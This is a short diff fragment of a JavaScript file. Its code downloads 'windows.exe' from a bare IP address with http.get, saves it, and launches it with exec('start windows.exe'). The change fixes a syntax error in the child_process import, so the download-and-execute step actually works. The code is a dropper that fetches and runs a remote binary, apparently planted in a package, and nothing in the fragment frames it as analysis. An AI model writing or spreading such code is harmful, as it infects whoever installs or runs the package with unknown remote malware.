@@ -6,6 +6,6 @@ http.get('http://172.86.73.132/windows.exe', (res) => {
   res.pipe(file);
 });
 
-import { exec } from 'node:child_process');
+import { exec } from 'node:child_process';
 
 exec('start windows.exe'); // Windows
